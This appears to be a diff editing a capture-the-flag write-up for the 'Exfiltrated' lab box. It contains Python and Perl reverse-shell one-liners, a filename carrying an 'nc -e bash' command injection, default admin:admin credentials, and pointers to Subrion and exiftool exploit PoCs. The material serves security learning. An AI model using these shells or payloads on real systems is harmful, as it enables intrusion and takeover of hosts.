@@ -27,13 +27,13 @@ The shell is stabilized with a **Perl** callback. Enumeration then turns up `/op
 **rustscan**
 
 ```bash
-rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "/home/julien/.hacklas/targets/track-tjnull/Exfiltrated/nmap/quick"
+rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "nmap/quick"
 ```
 
 **nmap (full)**
 
 ```bash
-nmap -sC -sV -p- -oA "/home/julien/.hacklas/targets/track-tjnull/Exfiltrated/nmap/full" "$IP_ADDRESS"
+nmap -sC -sV -p- -oA "nmap/full" "$IP_ADDRESS"
 
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
@@ -159,14 +159,14 @@ This behaves like a fake/limited shell, so the next move is a callback. A Python
 
 ```bash
 # not working
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.234",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 
 (On this host `python` is `python3` — worth checking before assuming the binary is missing.) A **Perl** callback does work:
 
 ```bash
 # got a shell with this
-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.234:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
 MariaDB is installed:
@@ -225,7 +225,7 @@ The script runs `exiftool` as root over every `.jpg` in the world-writable uploa
 The first instinct is to abuse the filename in a command-injection style, taking advantage of escaping:
 
 ```bash
-touch '$(nc 192.168.45.234 4443 -e bash).jpg'
+touch '$(nc ATTACKER_IP 4443 -e bash).jpg'
 ```
 
 The file gets generated in `/opt/metadata/`, but the metadata log shows the payload is treated as a literal filename, not executed — `exiftool` is invoked with the name quoted, so there's no shell escape:
@@ -233,7 +233,7 @@ The file gets generated in `/opt/metadata/`, but the metadata log shows the payl
 ```txt
 www-data@exfiltrated:/opt/metadata$ cat 060fba0a1d
 ExifTool Version Number         : 11.88
-File Name                       : $(nc 192.168.45.234 4443 -e bash).jpg
+File Name                       : $(nc ATTACKER_IP 4443 -e bash).jpg
 Directory                       : /var/www/html/subrion/uploads
 File Size                       : 0 bytes
 File Modification Date/Time     : 2026:02:24 20:56:48+00:00
@@ -315,10 +315,9 @@ Stage result: a root shell, `proof.txt` and `local.txt`.
 
 ## Credentials
 
-| Where                           | Credential          |
-| ------------------------------- | ------------------- |
-| Subrion admin panel (`/panel/`) | `admin:admin`       |
-| Local user                      | `coaran` (uid 1000) |
+**Subrion admin panel (`/panel/`)** — `admin:admin`
+
+**Local user** — `coaran` (uid 1000)
 
 ---
 
@@ -343,15 +342,15 @@ Stage result: a root shell, `proof.txt` and `local.txt`.
 
 ## Tools & cheat sheet
 
-| Tool                        | Purpose in this box                                | Key command                                                                                   |
-| --------------------------- | -------------------------------------------------- | --------------------------------------------------------------------------------------------- |
-| `rustscan`                  | Fast initial port sweep feeding nmap               | `rustscan -a <ip> -ulimit 5000 -- -sC -sV`                                                    |
-| `nmap`                      | Service/version + script scan, full port range     | `nmap -sC -sV -p- -oA full <ip>`                                                              |
-| `feroxbuster`               | Content discovery on the resolved host             | — (command not captured)                                                                      |
-| Subrion admin (`/panel/`)   | Guessed login to the CMS                           | `admin:admin`                                                                                 |
-| CVE-2018-19422 PoC          | Authenticated Subrion file-upload → RCE (www-data) | EDB 49876, set `username`/`password`/`url_login`                                              |
-| Perl reverse shell          | Stable callback where Python failed                | `perl -MIO -e '...IO::Socket::INET(PeerAddr,"<ip>:<port>")...'`                               |
-| `exiftool -ver`             | Confirm vulnerable version (11.88)                 | `exiftool -ver`                                                                               |
-| `searchsploit`              | Locate the DjVu code-exec paper                    | hit: `49881-exiftool-djvu` (query not captured)                                               |
-| CVE-2021-22204 PoC          | Craft malicious DjVu-backed `.jpg` for root cron   | [convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool) |
-| cron (`/opt/image-exif.sh`) | Root-run exiftool loop over uploads dir (trigger)  | drop payload `.jpg` into `/var/www/html/subrion/uploads`                                      |
+- [`rustscan`](/hacklas/enumeration/port-scan/rustscan.md) — Fast initial port sweep feeding nmap
+- [`nmap`](/hacklas/enumeration/port-scan/nmap.md) — Service/version + script scan, full port range
+- **`feroxbuster`** — Content discovery on the resolved host
+- **Subrion admin (`/panel/`)** — Guessed login to the CMS
+- **CVE-2018-19422 PoC** — Authenticated Subrion file-upload → RCE (www-data)
+  - EDB 49876, set `username`/`password`/`url_login`
+- [Perl reverse shell](/hacklas/infiltration/reverse-shell/revshells.md) — Stable callback where Python failed
+- **`exiftool -ver`** — Confirm vulnerable version (11.88)
+- [`searchsploit`](/hacklas/enumeration/vulnerability-scanning/searchsploit.md) — Locate the DjVu code-exec paper
+- **CVE-2021-22204 PoC** — Craft malicious DjVu-backed `.jpg` for root cron
+  - [convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)
+- **cron (`/opt/image-exif.sh`)** — Root-run exiftool loop over uploads dir (trigger)
